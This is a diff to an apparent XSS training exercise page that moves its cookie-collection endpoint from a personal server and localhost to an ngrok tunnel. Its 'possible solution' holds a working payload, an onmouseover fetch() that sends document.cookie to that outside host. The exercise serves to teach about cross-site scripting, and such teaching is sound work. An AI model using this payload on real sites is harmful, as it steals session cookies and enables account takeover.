@@ -48,7 +48,7 @@
 
     <ul>
         <li>Send the value of `document.cookie` to `GET
-            https://server.kevincunningham.co.uk/xss/five?cookie=COOKIE_PAYLOAD&name=YOUR_NAME`
+            https://3e36-51-52-158-78.ngrok-free.app/xss/five?cookie=COOKIE_PAYLOAD&name=YOUR_NAME`
         </li>
     </ul>
 
@@ -56,7 +56,7 @@
         <summary>Possible solution</summary>
         <pre>
 
-&lt;a href="#" onmouseover="fetch('http://localhost:3000/xss/five?name=Kevin&cookie='+document.cookie)"&gt;This is a link&lt;/a&gt;
+&lt;a href="#" onmouseover="fetch('https://3e36-51-52-158-78.ngrok-free.app/xss/five?name=Kevin&cookie='+document.cookie)"&gt;This is a link&lt;/a&gt;
 </pre>
     </details>
     <form method="POST">
